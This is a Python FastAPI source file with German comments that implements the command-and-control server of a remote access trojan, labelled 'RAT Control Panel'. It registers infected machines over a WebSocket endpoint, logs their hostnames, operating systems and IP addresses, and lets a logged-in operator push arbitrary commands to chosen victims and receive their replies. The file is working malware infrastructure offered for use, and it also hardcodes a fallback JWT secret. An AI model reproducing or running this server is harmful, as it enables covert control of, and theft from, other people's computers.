import asyncio
import json
import base64
import os
import secrets
import logging
import time
from datetime import datetime, timedelta
from typing import Dict, Set, Any

import jwt
import psutil
import uvicorn
import websockets
from fastapi import (FastAPI, WebSocket, WebSocketDisconnect, Depends,
                   HTTPException, status, Request)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials

# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS: Dict[str, WebSocket] = {}  # client_id: websocket
WEB_UI_SOCKETS: Set[WebSocket] = set()
CLIENT_INFOS: Dict[str, Dict[str, Any]] = {}  # client_id: {hostname, os, ip, last_seen}
COMMAND_LOGS: Dict[str, list] = {}
BANNED_IPS: Set[str] = set()
FAILED_LOGIN_ATTEMPTS: Dict[str, int] = {}

app = FastAPI(title="RAT Control Panel", version="2.1.0")

# --- Middleware ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# --- Debugging-Start: Umgebungsvariablen prüfen ---
logging.info(f"DEBUG: Lade Umgebungsvariablen...")
logging.info(f"DEBUG: ADMIN_USERNAME geladen: {'Ja' if ADMIN_USERNAME else 'Nein'}")
logging.info(f"DEBUG: ADMIN_PASSWORD geladen: {'Ja' if ADMIN_PASSWORD else 'Nein'}")
# --- Debugging-Ende ---

JWT_SECRET = os.getenv("JWT_SECRET", "e1a6addd5a87dca7d79d8a3c634be7e1")
JWT_ALGO = "HS256"
JWT_EXP_MINUTES = 120
CLIENT_TIMEOUT = 300  # Sekunden

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
start_time = time.time()

# --- Hilfsfunktionen ---
def log_command(client_id: str, action: str, payload: dict):
    if client_id not in COMMAND_LOGS:
        COMMAND_LOGS[client_id] = []
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "action": action,
        "payload": payload,
        "client_info": CLIENT_INFOS.get(client_id, {})
    }
    COMMAND_LOGS[client_id].append(log_entry)
    COMMAND_LOGS[client_id] = COMMAND_LOGS[client_id][-100:]

def get_server_stats() -> Dict[str, Any]:
    try:
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        return {
            "cpu_percent": psutil.cpu_percent(interval=0.1),
            "memory_percent": memory.percent,
            "memory_used_gb": round(memory.used / (1024**3), 2),
            "memory_total_gb": round(memory.total / (1024**3), 2),
            "disk_percent": disk.percent,
            "disk_used_gb": round(disk.used / (1024**3), 2),
            "disk_total_gb": round(disk.total / (1024**3), 2),
            "connected_clients": len(RAT_CLIENTS),
            "web_ui_connections": len(WEB_UI_SOCKETS),
            "banned_ips": len(BANNED_IPS),
            "uptime": time.time() - start_time
        }
    except Exception as e:
        logging.error(f"Error getting server stats: {e}")
        return {"error": str(e)}

# --- Authentifizierung ---
def create_jwt_token(username: str) -> str:
    payload = {"sub": username, "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)}
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

def verify_jwt_token(token: str) -> str | None:
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload.get("sub")
    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError) as e:
        logging.warning(f"JWT verification failed: {e}")
        return None

async def get_current_user_jwt(request: Request) -> str:
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid authentication credentials")
    
    token = auth_header.split(" ")[1]
    user = verify_jwt_token(token)
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid or expired token")
    return user

# --- Web-UI Endpunkte ---
@app.get("/login", response_class=HTMLResponse)
async def get_login_page():
    return FileResponse("login.html")


@app.post("/login")
async def login(request: Request):
    if not ADMIN_USERNAME or not ADMIN_PASSWORD:
        logging.critical("ADMIN_USERNAME oder ADMIN_PASSWORD sind nicht gesetzt!")
        raise HTTPException(status_code=500, detail="Server-Fehler: Admin-Konfiguration fehlt")

    client_ip = request.client.host if request.client else "unknown"
    if client_ip in BANNED_IPS:
        raise HTTPException(status_code=429, detail="IP ist gesperrt")

    if FAILED_LOGIN_ATTEMPTS.get(client_ip, 0) >= 5:
        BANNED_IPS.add(client_ip)
        raise HTTPException(status_code=429, detail="Zu viele fehlgeschlagene Versuche")

    try:
        data = await request.json()
        username = data.get("username")
        password = data.get("password")

        if not isinstance(username, str) or not isinstance(password, str):
            raise HTTPException(status_code=400, detail="Benutzername und Passwort müssen als Zeichenketten gesendet werden.")

        if secrets.compare_digest(username, ADMIN_USERNAME) and secrets.compare_digest(password, ADMIN_PASSWORD):
            FAILED_LOGIN_ATTEMPTS.pop(client_ip, None)
            token = create_jwt_token(username)
            logging.info(f"Successful login for '{username}' from {client_ip}")
            return {"token": token}
        else:
            FAILED_LOGIN_ATTEMPTS[client_ip] = FAILED_LOGIN_ATTEMPTS.get(client_ip, 0) + 1
            logging.warning(f"Failed login attempt for '{username}' from {client_ip}")
            raise HTTPException(status_code=401, detail="Falsche Anmeldeinformationen")
            
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Ungültiges JSON-Format")
    except Exception as e:
        logging.error(f"Unerwarteter Fehler beim Login: {e}")
        raise HTTPException(status_code=500, detail="Ein interner Serverfehler ist aufgetreten.")

@app.get("/", response_class=HTMLResponse)
async def get_index():
    return FileResponse("index.html")

@app.get("/api/stats")
async def get_stats(user: str = Depends(get_current_user_jwt)):
    return get_server_stats()

@app.get("/api/clients")
async def get_clients_api(user: str = Depends(get_current_user_jwt)):
    return {"clients": list(CLIENT_INFOS.values())}

# --- WebSocket-Kommunikation ---
async def send_to_web_ui(data: dict):
    """Sendet Daten an alle verbundenen Web-UIs."""
    if not WEB_UI_SOCKETS:
        return
    message = json.dumps(data)
    await asyncio.gather(*[ws.send_text(message) for ws in WEB_UI_SOCKETS])

async def send_client_list():
    """Sendet die aktuelle Client-Liste an die Web-UIs."""
    clients_data = list(CLIENT_INFOS.values())
    await send_to_web_ui({"type": "client_list", "clients": clients_data})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket-Endpunkt für die Web-UI."""
    token = websocket.query_params.get("token")
    user = verify_jwt_token(token)
    if not user:
        await websocket.close(code=4401)
        return

    await websocket.accept()
    WEB_UI_SOCKETS.add(websocket)
    logging.info(f"Web-UI verbunden: {user} ({websocket.client.host})")
    
    await send_client_list()

    try:
        while True:
            data = await websocket.receive_json()
            action = data.get("action")
            
            if action == "get_clients":
                await send_client_list()
                continue

            target_ids = data.get("target_ids", [])
            if isinstance(target_ids, str): # Kompatibilität mit alter Implementierung
                target_ids = [target_ids]

            if not target_ids:
                await websocket.send_json({"type": "error", "message": "Keine Ziel-Clients ausgewählt."})
                continue

            for target_id in target_ids:
                if target_id in RAT_CLIENTS:
                    try:
                        log_command(target_id, action, data)
                        await RAT_CLIENTS[target_id].send_json(data)
                    except Exception as e:
                        logging.error(f"Fehler beim Senden an Client {target_id}: {e}")
                else:
                    logging.warning(f"Befehl für nicht verbundenen Client {target_id} ignoriert.")

    except WebSocketDisconnect:
        logging.info(f"Web-UI getrennt: {user}")
    except Exception as e:
        logging.error(f"Fehler in der Web-UI-WebSocket-Verbindung: {e}")
    finally:
        WEB_UI_SOCKETS.discard(websocket)

@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    """WebSocket-Endpunkt für die RAT-Clients."""
    await websocket.accept()
    client_id = secrets.token_hex(8)
    
    try:
        # Erwarte eine initiale "info"-Nachricht vom Client
        initial_msg = await asyncio.wait_for(websocket.receive_json(), timeout=20)
        if initial_msg.get("type") != "info":
            await websocket.close(code=1003, reason="Invalid initial message")
            return

        info = initial_msg.get("data", {})
        hostname = info.get("hostname", "Unknown")
        client_ip = websocket.client.host or "unknown"
        
        RAT_CLIENTS[client_id] = websocket
        CLIENT_INFOS[client_id] = {
            "id": client_id,
            "hostname": hostname,
            "os": info.get("os", "Unknown"),
            "ip": info.get("ip", client_ip),
            "last_seen": time.time(),
        }
        
        logging.info(f"[+] RAT-Client verbunden: {hostname} ({client_id}) von {client_ip}")
        await send_client_list()

        # Haupt-Nachrichtenschleife
        while True:
            message = await websocket.receive_json()
            
            # Ping/Pong für Heartbeat
            if message.get("type") == "ping":
                CLIENT_INFOS[client_id]["last_seen"] = time.time()
                await websocket.send_json({"type": "pong"})
                continue

            # Leite alle anderen Nachrichten an die UI weiter
            message["client_id"] = client_id
            await send_to_web_ui(message)

    except (WebSocketDisconnect, asyncio.TimeoutError, websockets.exceptions.ConnectionClosedError) as e:
        logging.info(f"Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', 'N/A')}) getrennt: {type(e).__name__}")
    except Exception as e:
        logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
    finally:
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
        if client_id in CLIENT_INFOS:
            del CLIENT_INFOS[client_id]
        
        logging.info(f"[-] RAT-Client getrennt: {client_id}")
        await send_client_list()

async def cleanup_inactive_clients():
    """Entfernt Clients, die den Heartbeat-Timeout überschritten haben."""
    while True:
        await asyncio.sleep(60)
        now = time.time()
        inactive_ids = [
            cid for cid, info in CLIENT_INFOS.items() 
            if now - info.get("last_seen", now) > CLIENT_TIMEOUT
        ]
        
        if inactive_ids:
            logging.info(f"Entferne {len(inactive_ids)} inaktive Clients...")
            for cid in inactive_ids:
                if cid in RAT_CLIENTS:
                    await RAT_CLIENTS[cid].close()
                    del RAT_CLIENTS[cid]
                if cid in CLIENT_INFOS:
                    del CLIENT_INFOS[cid]
            await send_client_list()

@app.on_event("startup")
async def on_startup():
    asyncio.create_task(cleanup_inactive_clients())

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    logging.info(f"Starte RAT Control Panel auf Port {port}")
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")
